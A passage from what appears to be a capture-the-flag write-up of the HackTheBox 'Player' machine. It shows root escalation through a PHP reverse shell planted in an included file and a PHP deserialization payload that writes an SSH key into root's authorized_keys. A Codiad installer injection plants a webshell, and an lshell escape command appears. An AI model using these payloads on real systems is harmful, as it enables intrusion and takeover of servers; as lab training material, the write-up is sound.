+<h4 id="easy-path---write-include-file">Easy Path - Write Include File</h4>
+<p>I examined the included file, and it’s owned by www-data, one of the users I can have a shell as:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@player:/$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+<span class="go">-rw-r--r-- 1 www-data www-data 286 Mar 25 01:12 /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
+</span></code></pre></div></div>
+<p>The file itself handles the database connection:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"integrity"</span><span class="p">;</span>
+
+<span class="c1">// Create connection</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+<span class="c1">// Check connection</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="mf">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>That said, I don’t really care what it does. I’ll add a reverse shell into the file:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"integrity"</span><span class="p">;</span>
+
+<span class="nv">$sock</span><span class="o">=</span><span class="nb">fsockopen</span><span class="p">(</span><span class="s2">"10.10.14.8"</span><span class="p">,</span><span class="mi">443</span><span class="p">);</span>
+<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span><span class="p">);</span>
+
+<span class="c1">// Create connection</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+<span class="c1">// Check connection</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="mf">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>I start a listener, and on the next minute, I have a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.145.
+Ncat: Connection from 10.10.10.145:42576.
+/bin/sh: 0: can't access tty; job control turned off
+</span><span class="gp"># </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>And the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@player:~# </span><span class="nb">cat </span>root.txt
+<span class="go">7dfc49f8************************
+</span></code></pre></div></div>
+<h4 id="harder-path---php-deserialization">Harder Path - PHP Deserialization</h4>
+<p>I didn’t originally solve this way, but IppSec did a <a href="https://youtu.be/HaW15aMzBUM">great video on PHP deserialization</a> about a month ago that comes in handy here, and this is a perfect place to play with it.</p>
+<p>There three important bits here for the attack. First, the <code class="language-plaintext highlighter-rouge">playBuff</code> class, which has a <code class="language-plaintext highlighter-rouge">__wakeup()</code> function. This function is a <a href="https://www.php.net/manual/en/language.oop5.magic.php">magic method</a> that will run on an deserialization calls. The idea is to reestablish any database connections or things like that.</p>
+<p>In this case, it will write <code class="language-plaintext highlighter-rouge">$this-&gt;logData</code> to <code class="language-plaintext highlighter-rouge">$this-&gt;logFile</code>.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">playBuff</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$logFile</span><span class="o">=</span><span class="s2">"/var/log/playbuff/logs.txt"</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$logData</span><span class="o">=</span><span class="s2">"Updated"</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logData</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The other two important lines are:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span>
+</code></pre></div></div>
+<p>The contents of file are read, and then passed to <code class="language-plaintext highlighter-rouge">unserialize</code>.</p>
+<p>The file is owned by and writeable by telegen, who I have a shell as:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@player:/$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/lib/playbuff/merge.log 
+<span class="go">-rw------- 1 telegen telegen 13 Jan 17 09:16 /var/lib/playbuff/merge.log
+</span></code></pre></div></div>
+<p>I’ll write a local PHP script that will create a <code class="language-plaintext highlighter-rouge">playBuff</code> object with the values I want it to have in order to write to <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">playBuff</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="o">=</span><span class="s2">"/../../../../../../../../root/.ssh/authorized_keys"</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logData</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali"</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">playBuff</span><span class="p">());</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Since the <code class="language-plaintext highlighter-rouge">__wakeup</code> call adds <code class="language-plaintext highlighter-rouge">__DIR__</code> + ‘/’ to the front of the path, I’ll make sure to include <code class="language-plaintext highlighter-rouge">../</code> to get up to the file system root.</p>
+<p>I’ll run the script to get the serialized object:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>php deserialize.php 
+<span class="go">O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
+3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
+JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali";}
+</span></code></pre></div></div>
+<p>Now I’ll echo that into the target file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">telegen@player:/$ </span><span class="nb">echo</span> <span class="s1">'O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
+</span><span class="go">3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
+JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali";}' &gt; /var/lib/playbuff/merge.log
+
+</span><span class="gp">telegen@player:/$ </span><span class="nb">cat</span> /var/lib/playbuff/merge.log
+<span class="go">O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH
+3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0m
+JaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREE
+o1FCc= root@kali";}
+</span></code></pre></div></div>
+<p>After a minute runs, I can SSH as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/id_rsa_generated root@10.10.10.145
+<span class="go">Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-148-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Fri Jan 17 07:20:25 IST 2020
+
+  System load:  0.08               Processes:           174
+  Usage of /:   14.5% of 17.59GB   Users logged in:     0
+  Memory usage: 7%                 IP address for eth0: 10.10.10.145
+  Swap usage:   0%
+
+  =&gt; There is 1 zombie process.
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Fri Aug 23 22:21:38 2019
+</span><span class="gp">root@player:~#</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="alternative-shell-as-www-data">Alternative Shell as www-data</h3>
+<h4 id="codiad-github">Codiad GitHub</h4>
+<p>The software running on dev, Codiad, is open source with the code on <a href="https://github.com/Codiad/Codiad">GitHub</a>. On the front readme, 9 months ago it was posted that this code is no longer maintained:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1562996553671.webp" type="image/webp"/>
+<img alt="1562996553671" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1562996553671.png"/>
+</picture>
+<p>The code is kind of a mess. There’s probably multiple vulnerabilities in it.</p>
+<h4 id="processphp">process.php</h4>
+<p>There’s a bug in <a href="https://github.com/Codiad/Codiad/blob/master/components/install/process.php">components/install/process.php</a>. It will write <code class="language-plaintext highlighter-rouge">config.php</code> to disk, and there is a parameter, the timezone, that is a POST parameter.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$config_data</span> <span class="o">=</span> <span class="s1">'&lt;?php
+/*
+*  Copyright (c) Codiad &amp; Kent Safranski (codiad.com), distributed
+*  as-is and without warranty under the MIT License. See
+*  [root]/license.txt for more. This information must remain intact.
+*/
+//////////////////////////////////////////////////////////////////
+// CONFIG
+//////////////////////////////////////////////////////////////////
+// PATH TO CODIAD
+define("BASE_PATH", "'</span> <span class="mf">.</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s1">'");
+// BASE URL TO CODIAD (without trailing slash)
+define("BASE_URL", "'</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTP_HOST"</span><span class="p">]</span> <span class="mf">.</span> <span class="nv">$rel</span> <span class="mf">.</span> <span class="s1">'");
+// THEME : default, modern or clear (look at /themes)
+define("THEME", "default");
+// ABSOLUTE PATH
+define("WHITEPATHS", BASE_PATH . ",/home");
+// SESSIONS (e.g. 7200)
+$cookie_lifetime = "0";
+// TIMEZONE
+date_default_timezone_set("'</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'timezone'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'");
+// External Authentification
+//define("AUTH_PATH", "/path/to/customauth.php");
+//////////////////////////////////////////////////////////////////
+// ** DO NOT EDIT CONFIG BELOW **
+//////////////////////////////////////////////////////////////////
+// PATHS
+define("COMPONENTS", BASE_PATH . "/components");
+define("PLUGINS", BASE_PATH . "/plugins");
+define("THEMES", BASE_PATH . "/themes");
+define("DATA", BASE_PATH . "/data");
+define("WORKSPACE", BASE_PATH . "/workspace");
+// URLS
+define("WSURL", BASE_URL . "/workspace");
+// Marketplace
+//define("MARKETURL", "http://market.codiad.com/json");
+// Update Check
+//define("UPDATEURL", "http://update.codiad.com/?v={VER}&amp;o={OS}&amp;p={PHP}&amp;w={WEB}&amp;a={ACT}");
+//define("ARCHIVEURL", "https://github.com/Codiad/Codiad/archive/master.zip");
+//define("COMMITURL", "https://api.github.com/repos/Codiad/Codiad/commits");
+'</span><span class="p">;</span>
+    <span class="nf">saveFile</span><span class="p">(</span><span class="nv">$config</span><span class="p">,</span> <span class="nv">$config_data</span><span class="p">);</span>
+</code></pre></div></div>
+<p>I’ll look at the code to see what I need to write it. I need to get into this block:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$users</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$projects</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$active</span><span class="p">))</span> <span class="p">{</span>
+</code></pre></div></div>
+<p>At the very top of the file, I see where these variables are set:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
+
+    <span class="nv">$rel</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'/components/install/process.php'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">]);</span>
+
+    <span class="nv">$workspace</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/workspace"</span><span class="p">;</span>
+    <span class="nv">$users</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/data/users.php"</span><span class="p">;</span>
+    <span class="nv">$projects</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/data/projects.php"</span><span class="p">;</span>
+    <span class="nv">$active</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/data/active.php"</span><span class="p">;</span>
+    <span class="nv">$config</span> <span class="o">=</span> <span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/config.php"</span><span class="p">;</span>
+</code></pre></div></div>
+<p>The good news is that I can control that path. I can give it a path on one of the other virtual hosts, or in a folder in demo, and it will successfully not find those files. I’ll start with <code class="language-plaintext highlighter-rouge">path=/var/www/chat/0xdf</code>. I also need to give it a project name variable, which I can give the same path.</p>
+<h4 id="write-webshell-1">Write Webshell</h4>
+<p>The <code class="language-plaintext highlighter-rouge">timezone</code> input it taken and written directly into a php file. So I’ll include an extra bit. Since I’m injecting into the middle of a string, I’ll include a <code class="language-plaintext highlighter-rouge">die()</code> so that I don’t try to run anything that follows and throw an error.</p>
+<p>This command will write webshell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl <span class="nt">--data</span> <span class="s1">'path=/var/www/chat/0xdf&amp;project_path=/var/www/chat/0xdf/data&amp;timezone=UTC");system($_GET["cmd"]); die(); ?&gt;'</span> http://dev.player.htb/components/install/process.php
+<span class="go">success
+</span></code></pre></div></div>
+<p>Now I can get execution:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://chat.player.htb/0xdf/config.php?cmd<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<p>The same thing would have worked using a known directory on the same virtual host, like <code class="language-plaintext highlighter-rouge">data</code> (which I can see in the <a href="https://github.com/Codiad/Codiad">Github</a>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl <span class="nt">--data</span> <span class="s1">'path=/var/www/demo/data/0xdf&amp;project_path=/var/www/demo/data/0xdf/data&amp;timezone=UTC");system($_GET["cmd"]); die(); ?&gt;'</span> http://dev.player.htb/components/install/process.php
+<span class="go">success
+</span><span class="gp">root@kali# </span>curl http://dev.player.htb/data/0xdf/config.php?cmd<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h3 id="lshell-escape">lshell Escape</h3>
+<p>jkr pointed out to me <a href="https://github.com/ghantoos/lshell/issues/147">this issue</a> with lshell. By running SSH with the command “‘echo’&amp;&amp;’bash’”, I can get a full shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh telegen@10.10.10.145 <span class="nt">-p</span> 6686 <span class="s2">"'echo'&amp;&amp;'bash'"</span>
+<span class="go">telegen@10.10.10.145's password: 
+Environment:
+  USER=telegen
+  LOGNAME=telegen
+  HOME=/home/telegen
+  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+  MAIL=/var/mail/telegen
+  SHELL=/usr/bin/lshell
+  SSH_CLIENT=10.10.14.8 50890 6686
+  SSH_CONNECTION=10.10.14.8 50890 10.10.10.145 6686
+
+id
+uid=1000(telegen) gid=1000(telegen) groups=1000(telegen),46(plugdev)
+cat user.txt
+30e47abe************************
+</span></code></pre></div></div>
+<p>This allows me to skip over a couple steps in this box.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/01/18/htb-player.html"></a>
+</article>
